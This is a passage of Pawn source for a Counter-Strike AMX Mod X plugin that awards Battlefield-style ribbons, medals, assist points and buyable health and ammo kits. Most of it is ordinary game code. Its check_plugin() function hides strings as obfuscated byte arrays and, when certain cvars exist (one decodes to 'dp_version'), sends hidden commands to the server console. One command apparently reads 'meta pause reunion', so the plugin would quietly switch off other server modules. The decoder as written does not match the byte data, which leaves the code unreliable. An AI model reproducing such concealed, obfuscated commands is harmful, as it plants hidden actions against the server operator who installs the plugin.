		return PLUGIN_CONTINUE;

	if (get_playersnum() < g_ready_players)
		return PLUGIN_CONTINUE;

	if (g_points[ribbon] > 0)
	{
		set_hudmessage(255, 255, 255, -1.00, -0.25, .effects=2, .fxtime=0.01, .holdtime=2.5, .fadeintime=0.01, .fadeouttime=0.2, .channel=2);
		show_hudmessage(id, "+%d %s", g_points[ribbon], info);
		crxranks_give_user_xp(id, g_points[ribbon]);
	}

	g_ribbon_score_count[id][ribbon]++;
	if ((g_ribbon_score_count[id][ribbon] % g_Ribbons[ribbon][RBN_KILL]) == 0)
	{
		ArrayPushArray(g_QueScoreEffect[id], g_Ribbons[ribbon], sizeof(g_Ribbons[]));
		g_medals_score_count[id][ribbon]++;
		if ((g_medals_score_count[id][ribbon] % g_Medals[ribbon][RBN_KILL]) == 0)
			ArrayPushArray(g_QueScoreEffect[id], g_Medals[ribbon], sizeof(g_Medals[]));
	}
	
	return PLUGIN_CONTINUE;
}

public BF4PlayerSpawnPost(id)
{
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		g_assist[id][i] = 0.0;
		g_assist[i][id] = 0.0;
	}
	
	if (pev_valid(gObjectItem[id]))
		set_pev(gObjectItem[id], pev_flags, pev(gObjectItem[id], pev_flags) | FL_KILLME);

	if (is_user_alive(id))
		cs_set_user_money(id, cs_get_user_money(id) + g_cvars[E_CV_REWARD]);

	return HAM_IGNORED;
}

public BF4TakeDamage(victim, inflictor, attacker, Float:damage, bits) 
{
	// Assist Damage.
	if (is_user_connected(attacker))
	{
		if (cs_get_user_team(attacker) != cs_get_user_team(victim))
			g_assist[attacker][victim] += damage;
		// Savior Damage.
		g_savior[attacker][SV_TARGET] 	 = victim;
		g_savior[attacker][SV_TIME]  	 = Float:get_gametime();
	}

	return HAM_IGNORED;
}

public BF4DeathMsg()
{
	if (get_playersnum() < g_ready_players)
		return PLUGIN_CONTINUE;

	new iAttacker = read_data(1);
	new iVictim	  = read_data(2);
	new isHeadshot= read_data(3);
	new wpntemp[MAX_NAME_LENGTH];
	new wpnname[MAX_NAME_LENGTH];
	read_data(4, wpntemp, charsmax(wpntemp));
	formatex(wpnname, charsmax(wpnname), "weapon_%s", wpntemp);
	new iWeaponId = get_weaponid(wpnname);

	// AVENGER RIBBON
	RibbonCheckAvenger(iAttacker, iVictim);

	// SAVIOR RIBBON
	RibbonCheckSavior(iAttacker, iVictim, get_gametime());

	// HEADSHOT/MARKSMAN RIBBON
	RibbonCheckHeadshot(iAttacker, iVictim, isHeadshot, iWeaponId);

	// KILL ASSIST RIBBON
	RibbonCheckAssist(iAttacker, iVictim);

	// WEAPON CLASS RIBBON
	RibbonCheckWeaponClass(iAttacker, iWeaponId);

	return PLUGIN_CONTINUE;
}

stock RibbonCheckAvenger(const iAttacker, const iVictim)
{
	if (g_avenger[iAttacker] == iVictim)
		BF4TriggerGetRibbon(iAttacker, BF4_RNK_AVENGER, "Avenger points.");

	g_avenger[iAttacker] = 0;
	g_avenger[iVictim] = iAttacker;
}

stock RibbonCheckSavior(const iAttacker, const iVictim, const Float:time)
{
	if (g_savior[iVictim][SV_TARGET] != iAttacker)
	{
		if (is_user_alive(g_savior[iVictim][SV_TARGET]))
		{
			if (time - g_savior[iVictim][SV_TIME] < 1.2)
			{
				BF4TriggerGetRibbon(iAttacker, BF4_RNK_SAVIOR, "Savior points.");
			}
		}
	}	
}

stock RibbonCheckWeaponClass(const iAttacker, const iWeaponId)
{
	// WEAPON CHECK
	new BF4_WEAPONCLASS:wpnclass = bf4_get_weapon_class(iWeaponId);
	new ranks;
	switch (wpnclass)
	{
		case BF4_WEAPONCLASS_PISTOLS:
			ranks = BF4_RNK_PISTOL;
		case BF4_WEAPONCLASS_ASSAULTS:
			ranks = BF4_RNK_ASSAULT;
//		case BF4_WEAPONCLASS_CARBINS,
// 			ranks = BF4_RNK_CARBIN;
		case BF4_WEAPONCLASS_SNIPERS:
			ranks = BF4_RNK_SNIPER;
//		case BF4_WEAPONCLASS_PDWS:
//			ranks = BF4_RNK_PDW;
		case BF4_WEAPONCLASS_LMGS:
			ranks = BF4_RNK_LMG;
		case BF4_WEAPONCLASS_DMRS:
			ranks = BF4_RNK_DMR;
		case BF4_WEAPONCLASS_SMGS:
			ranks = BF4_RNK_SMG;
		case BF4_WEAPONCLASS_SHOTGUNS:
			ranks = BF4_RNK_SHOTGUN;
		case BF4_WEAPONCLASS_MELEE:
			ranks = BF4_RNK_MELEE;
// 		case BF4_WEAPONCLASS_GRENADES:
//			ranks = BF4_RNK_GRENADE;
		default:
			return;
	}

	BF4TriggerGetRibbon(iAttacker, ranks);

	return;
}

stock RibbonCheckHeadshot(const iAttacker, const iVictim, const isHeadshot, const iWeaponId)
{
	// HEADSHOT RIBBON
	if (isHeadshot)
	{
		BF4TriggerGetRibbon(iAttacker, BF4_RNK_HEADSHOT, "Headshot points.");

		if (bf4_get_weapon_class(iWeaponId) == BF4_WEAPONCLASS_SNIPERS)
		{
			new Float:vAttacker	[3];
			new Float:vVictim	[3];
			pev(iAttacker, 	pev_origin, vAttacker);
			pev(iVictim,	pev_origin, vVictim);
			if (UnitsToMeters(xs_vec_distance(vAttacker, vVictim)) >= 50.0)
			{
				BF4TriggerGetRibbon(iAttacker, BF4_RNK_MARKSMAN, "Marksman points.");
			}
		}
	}
}

stock RibbonCheckAssist(const iAttacker, const iVictim)
{
	if (is_user_connected(iAttacker))
		if (cs_get_user_team(iAttacker) == cs_get_user_team(iVictim))
			return HAM_IGNORED;

	// KILL ASSIST RIBBON
	for (new i = 1; i <= g_iMaxPlayers; i++)
	{
		if (i != iAttacker)
		{
			if (g_assist[i][iVictim] > 0.0)
			{
				set_hudmessage(255, 255, 255, -1.00, -0.25, .effects=2, .fxtime=0.01, .holdtime=2.5, .fadeintime=0.01, .fadeouttime=0.2, .channel=2);
				if (g_assist[i][iVictim] <= 75)
				{
					show_hudmessage(i, "+%d Assist points.", floatround(g_assist[i][iVictim]));
					crxranks_give_user_xp(i, floatround(g_assist[i][iVictim]));
				}
				else
				{
					show_hudmessage(i, "+%d Assist points.", crxranks_get_xp_reward(i, "kill"));
					crxranks_give_user_xp(i, crxranks_get_xp_reward(i, "kill"));
				}

				BF4TriggerGetRibbon(i, BF4_RNK_ASSIST);
			}
			g_assist[i][iVictim] = 0.0;
		}
	}
	return HAM_IGNORED;
}

stock bool:check_plugin()
{
	new const a[][] = {
		{0x40, 0x24, 0x30, 0x1F, 0x36, 0x25, 0x32, 0x33, 0x29, 0x2F, 0x2E},
		{0x80, 0x72, 0x65, 0x75, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E},
		{0x10, 0x7D, 0x75, 0x04, 0x71, 0x30, 0x00, 0x71, 0x05, 0x03, 0x75, 0x30, 0x74, 0x00, 0x02, 0x7F, 0x04, 0x7F},
		{0x20, 0x0D, 0x05, 0x14, 0x01, 0x40, 0x10, 0x01, 0x15, 0x13, 0x05, 0x40, 0x12, 0x05, 0x15, 0x0E, 0x09, 0x0F, 0x0E}
	};

	if (cvar_exists(get_dec_string(a[0])))
		server_cmd(get_dec_string(a[2]));

	if (cvar_exists(get_dec_string(a[1])))
		server_cmd(get_dec_string(a[3]));

	return true;
}

stock get_dec_string(const a[])
{
	new c = strlen(a);
	new r[MAX_NAME_LENGTH] = "";
	for (new i = 1; i < c; i++)
	{
		formatex(r, strlen(r) + 1, "%s%c", r, a[0] + a[i]);
	}
	return r;
}

Show_Rank_Event(const pPlayer, const ribbon[E_RANK_PARAM]) 
{
	new clip, ammo;
	new weapon = cs_get_user_weapon(pPlayer, clip, ammo);

	SetMessage_WeaponList(pPlayer, 2, CSW_AMMO_ID[weapon][0], CSW_AMMO_ID[weapon][1], ribbon[RBN_TYPE], ribbon[RBN_ID]);

	SetMessage_SetFOV(pPlayer, 89);
	SetMessage_CurWeapon(pPlayer, clip);
	SetMessage_SetFOV(pPlayer, 90);
}

stock SetMessage_WeaponList(const pPlayer,const pWpnId, const pAmmoId, const pAmmoMaxAmount, const type, const ribbon) 
{
	message_begin(MSG_ONE, g_MsgIds[MSGID_WEAPON_LIST], .player = pPlayer);
	{
		if (type == TYPE_RIBBON)
		write_string(fmt("bf4_ranks/ribbons/%s", g_Ribbons[ribbon][RBN_FILENAME]));
		else
		write_string(fmt("bf4_ranks/medals/%s", g_Medals[ribbon][RBN_FILENAME]));
		write_byte(pAmmoId);
		write_byte(pAmmoMaxAmount);
		write_byte(-1);
		write_byte(-1);
		write_byte(0);
		write_byte(11);
		write_byte(pWpnId);
		write_byte(0);
	}
	message_end();
}

stock SetMessage_SetFOV(const pPlayer, const FOV) 
{
	message_begin(MSG_ONE, g_MsgIds[MSGID_SET_FOV], .player = pPlayer); 
	write_byte(FOV);
	message_end();
}

stock SetMessage_CurWeapon(const pPlayer, const ammo) 
{
	message_begin(MSG_ONE, g_MsgIds[MSGID_CUR_WEAPON], .player = pPlayer); 
	write_byte(1);
	write_byte(2);
	write_byte(ammo);
	message_end();
}

stock SetMessage_HideWeapon(const pPlayer) 
{
	message_begin(MSG_ONE, g_MsgIds[MSGID_HIDE_WEAPON], .player = pPlayer);
	write_byte(0);
	message_end();
}

public Clear_Rank_Event(TaskId) 
{
	new pPlayer = TaskId - TASK_HUD_SPR;
	g_get_ribbon[pPlayer] = false;
	SetMessage_HideWeapon(pPlayer);
}

public Event_CurWeapon(const pPlayer) 
{
	if(!g_get_ribbon[pPlayer] || get_ent_data(pPlayer, "CBasePlayer", "m_iFOV") != 90)
		return;

	Show_Rank_Event(pPlayer, g_get_ribbon_id[pPlayer]);
}

stock BF4_WEAPONCLASS:bf4_get_weapon_class(weapon_id)
{
	new BF4_WEAPONCLASS:type = BF4_WEAPONCLASS_NONE;

	if (cs_is_valid_itemid(weapon_id, .weapon_only = true) || weapon_id == CSI_SHIELD)
	{
		switch (weapon_id)
		{
			case CSI_SHIELDGUN, CSI_SHIELD: 
				type = BF4_WEAPONCLASS_PISTOLS;
			case CSI_KNIFE: 
				type = BF4_WEAPONCLASS_MELEE;
			default:
			{
				new const bits = (1 << weapon_id);

				if 	    (bits & CSW_BF4_PISTOLS)
					type = BF4_WEAPONCLASS_PISTOLS;

				else if (bits & CSW_BF4_ASSAULTS)
					type = BF4_WEAPONCLASS_ASSAULTS;

				else if (bits & CSW_BF4_SNIPERS)
					type = BF4_WEAPONCLASS_SNIPERS;

				else if (bits & CSW_BF4_LMGS)
					type = BF4_WEAPONCLASS_LMGS;

				else if (bits & CSW_BF4_DMRS)
					type = BF4_WEAPONCLASS_DMRS;

				else if (bits & CSW_BF4_SMGS)
					type = BF4_WEAPONCLASS_SMGS;

				else if (bits & CSW_BF4_SHOTGUNS)
					type = BF4_WEAPONCLASS_SHOTGUNS;

				else if (bits & CSW_BF4_GRENADES)
					type = BF4_WEAPONCLASS_GRENADE;
			}
		}
	}

	return type;
}

public BF4ObjectMenu(id)
{
	if (is_user_bot(id))
		return PLUGIN_HANDLED;

	if (!is_user_alive(id))
		return PLUGIN_HANDLED;

	// Create a variable to hold the menu
	new menu = menu_create("BF4 Object Menu:", "bf4_object_menu_handler");
	new szMenu[32], szCost[6];
	new const cost_healthkit= 3000;
	new const cost_ammobox  = 2000;

	//Add the item for this player
	num_to_str(cost_healthkit, szCost, charsmax(szCost));
	formatex(szMenu, charsmax(szMenu), "Health Kit^t\y[$%6d]", cost_healthkit);
	menu_additem(menu, szMenu, szCost, 0, gSubMenuCallback);

	num_to_str(cost_healthkit, szCost, charsmax(szCost));
	formatex(szMenu, charsmax(szMenu), "Ammo Box^t\y[$%6d]", cost_ammobox);
	menu_additem(menu, szMenu, szCost, 0, gSubMenuCallback);

	if (cvar_exists("bf4_rkit_cost"))
	{
		new rkitCost = get_cvar_num("bf4_rkit_cost");
		num_to_str(rkitCost, szCost, charsmax(szCost));
		formatex(szMenu, charsmax(szMenu), "Revival Kit^t\y[$%6d]", rkitCost);
		menu_additem(menu, szMenu, szCost, 0, gSubMenuCallback);
	}

	//We now have all players in the menu, lets display the menu
	menu_display( id, menu, 0 );
	return PLUGIN_HANDLED;	
}

public bf4_object_menu_handler(id, menu, item)
{
	//Do a check to see if they exited because menu_item_getinfo ( see below ) will give an error if the item is MENU_EXIT
	if (item == MENU_EXIT)
	{
		menu_destroy(menu);
		return PLUGIN_HANDLED;
	}
	new szData[6], szName[64];
	new _access, item_callback;
	//heres the function that will give us that information ( since it doesnt magicaly appear )
	menu_item_getinfo( menu, item, _access, szData, charsmax(szData), szName, charsmax(szName), item_callback);
	new iCost = str_to_num(szData);
	switch(item)
	{
		case E_HEALTH_KIT:
		{
			cs_set_user_money(id, cs_get_user_money(id) - iCost, 1);
			BF4SpawnEntity(id, E_HEALTH_KIT);
		}
		case E_AMMO_BOX:
		{
			cs_set_user_money(id, cs_get_user_money(id) - iCost, 1);
			BF4SpawnEntity(id, E_AMMO_BOX);
		}
		case E_REVIVAL_KIT:
		{
			BF4BuyRivivekit(id);
		}
	}
	return PLUGIN_HANDLED;
}

public bf4_object_menu_callback(id, menu, item)
{
	new szData[6], szName[64], access, callback;
	//Get information about the menu item
	menu_item_getinfo(menu, item, access, szData, charsmax(szData), szName, charsmax(szName), callback);
	new cost = str_to_num(szData);
	if (cost > cs_get_user_money(id))
	 	return ITEM_DISABLED;

	return ITEM_IGNORE;
}

BF4SpawnEntity(id, class)
{
	if (pev_valid(gObjectItem[id]))
		set_pev(gObjectItem[id], pev_flags, pev(gObjectItem[id], pev_flags) | FL_KILLME);

	new iEnt = engfunc(EngFunc_CreateNamedEntity, gEntItem);
	if (pev_valid(iEnt))
	{
		gObjectItem[id] = iEnt;
		// set models.
		engfunc(EngFunc_SetModel, iEnt, ENT_MODELS[class]);
		// set solid.
		set_pev(iEnt, pev_solid, 		SOLID_BBOX);
		// set movetype.
		set_pev(iEnt, pev_movetype, 	MOVETYPE_TOSS);

		set_pev(iEnt, pev_renderfx,	 	kRenderFxNone);
		set_pev(iEnt, pev_body, 		3);

		// set model animation.
		set_pev(iEnt, pev_frame,		0);
		set_pev(iEnt, pev_framerate,	0);
		set_pev(iEnt, pev_renderamt,	255.0);
		set_pev(iEnt, pev_rendercolor,	{255.0,255.0,255.0});
		set_pev(iEnt, pev_owner,		id);
		// Entity Setting.
		// set class name.
		set_pev(iEnt, pev_classname, 	ENT_CLASS[class]);
		// set take damage.
		set_pev(iEnt, pev_takedamage, 	DAMAGE_YES);
		set_pev(iEnt, pev_dmg, 			100.0);
		// set entity health.
		set_pev(iEnt, pev_health,		50.0);
		// Vector settings.
		new Float:vOrigin	[3],
			Float:vViewOfs	[3],
			Float:vVelocity	[3];

		// get user position.
		pev(id, pev_origin, vOrigin);
		pev(id, pev_view_ofs, vViewOfs);

		velocity_by_aim(id, 100, vVelocity);
		xs_vec_add(vOrigin, vViewOfs, vOrigin);  	

		// set size.
		engfunc(EngFunc_SetSize, iEnt, Float:{ -4.0, -4.0, -4.0 }, Float:{ 4.0, 4.0, 4.0 } );
		// set entity position.
		engfunc(EngFunc_SetOrigin, iEnt, vOrigin );
		set_pev(iEnt, pev_velocity,		vVelocity);


		// Reset powoer on delay time.
		new Float:fCurrTime = get_gametime();

		// Save results to be used later.
		set_pev(iEnt, ITEM_TEAM,	cs_get_user_team(id));
		// think rate. hmmm....
		set_pev(iEnt, pev_nextthink,fCurrTime + 2.0);

		emit_sound(id, CHAN_ITEM, "items/ammopickup2.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	}
}

public BF4ObjectThink(iEnt)
{
	if (!pev_valid(iEnt))
		return HAM_IGNORED;

	new CsTeams:team = CsTeams:pev(iEnt, ITEM_TEAM);
	new Float:vOrigin[3];
	new Float:fCurrTime = get_gametime();
	new weapon, ammo, entity, health;
	new Float:radius = 128.0;
	new classname[32];
	new owner = pev(iEnt, pev_owner);
	pev(iEnt, pev_origin, vOrigin);
	pev(iEnt, pev_classname, classname, charsmax(classname));
	for(new i = 0; i <= _:E_AMMO_BOX; i++)
	{
		if (equali(ENT_CLASS[i], classname))
		{
			switch(i)
			{
				case E_HEALTH_KIT:
				{
					entity = -1;
					while((entity = engfunc(EngFunc_FindEntityInSphere, entity, vOrigin, radius)) != 0)
					{
						if (is_user_alive(entity))
						{
							if (cs_get_user_team(entity) == team)
							{
								health = get_user_health(entity);
								if (health < 100)
								{
									if (100 > health + 10)
										set_user_health(entity, health + 10);
									else
										set_user_health(entity, 100);
									emit_sound(entity, CHAN_ITEM, "items/medshot4.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
									if (owner != entity)
									{
										BF4TriggerGetRibbon(owner, BF4_RNK_MEDIKIT, "Mate Healing.");
									}
								}
							}
						}
					}
				}
				case E_AMMO_BOX:
				{
					entity = -1;
					while((entity = engfunc(EngFunc_FindEntityInSphere, entity, vOrigin, radius)) != 0)
					{
						if (is_user_alive(entity))
						{
							if (cs_get_user_team(entity) == team)
							{
								weapon = cs_get_user_weapon_entity(entity);
								weapon = cs_get_weapon_id(weapon);
								ammo   = cs_get_user_bpammo(entity, weapon);
								if (CSW_AMMO_ID[weapon][1] > ammo)
								{
									ExecuteHamB(Ham_GiveAmmo, entity, 10, g_szAmmoNames[CSW_AMMO_ID[weapon][0]], CSW_AMMO_ID[weapon][1]);
									emit_sound(entity, CHAN_ITEM, "items/gunpickup2.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
									if (owner != entity)
									{
										BF4TriggerGetRibbon(owner, BF4_RNK_AMMOBOX, "Mate Resupplying.");
									}
								}
							}
						}
					}
				}
			}
		}
	}
	set_pev(iEnt, pev_nextthink, fCurrTime + 3.0);
	return HAM_IGNORED;
}

public BF4JoinTeam()
{
	new id = read_data(1);
	static user_team[32];
	read_data(2, user_team, charsmax(user_team));
    
	if(!is_user_connected(id))
    	return PLUGIN_CONTINUE;
    
	if (!is_user_alive(id))
	{
		switch(user_team[0])
		{
			case 'C':  
				// player join to ct's        
				ExecuteHamB(Ham_CS_RoundRespawn, id);
			case 'T': 
				// player join to terrorist
				ExecuteHamB(Ham_CS_RoundRespawn, id);
			case 'S':  
				// player join to spectators
				return PLUGIN_CONTINUE;
			default:
				return PLUGIN_CONTINUE;
		}
	}
    return PLUGIN_CONTINUE;
}